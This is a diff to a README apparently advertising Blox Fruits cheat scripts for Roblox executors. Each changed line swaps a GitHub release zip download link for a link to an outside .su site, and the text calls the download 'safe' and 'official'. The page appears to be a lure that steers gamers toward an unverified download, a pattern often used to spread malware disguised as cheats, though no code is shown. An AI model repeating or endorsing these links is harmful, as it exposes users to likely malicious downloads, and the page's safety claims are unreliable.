@@ -5,10 +5,10 @@
 Welcome to the **Blox Fruits Script Hub**, your one-stop destination for the **best and fully updated scripts** for *Blox Fruits*. Whether you're looking to **auto farm fragments**, unlock **fruit notifiers**, optimize **chest farming**, or automate **sea events**, we've got you covered with powerful and safe scripts compatible with **Delta Executor**, **Solara**, **Xeno**, **Krnl**, and more!
 
 [![maxresdefault](https://github.com/user-attachments/assets/aeb811fc-a030-4f73-bdb8-476d95bf0a6d)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 [![image](https://github.com/user-attachments/assets/38ba2343-1204-4a9b-94ec-383a396005cd)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 ---
 
@@ -18,7 +18,7 @@ Welcome to the **Blox Fruits Script Hub**, your one-stop destination for the **b
 
 To enhance gameplay and streamline progression, players often use **scripts**—custom Lua codes that automate repetitive tasks, improve efficiency, and provide in-game advantages.
 
-### 🔽 [Instant Download – Blox Fruits Script 🔓](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+### 🔽 [Instant Download – Blox Fruits Script 🔓](https://hardware-gui.su/)
 
 
 ---
@@ -27,7 +27,7 @@ To enhance gameplay and streamline progression, players often use **scripts**—
 
 To grab the latest version, click below:
 
-➡️ [🟢 DOWNLOAD HERE – Official Link](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip) ⬅️
+➡️ [🟢 DOWNLOAD HERE – Official Link](https://hardware-gui.su/) ⬅️
 (Updated regularly with hotfixes, optimizations, and new features.)
 
 ---
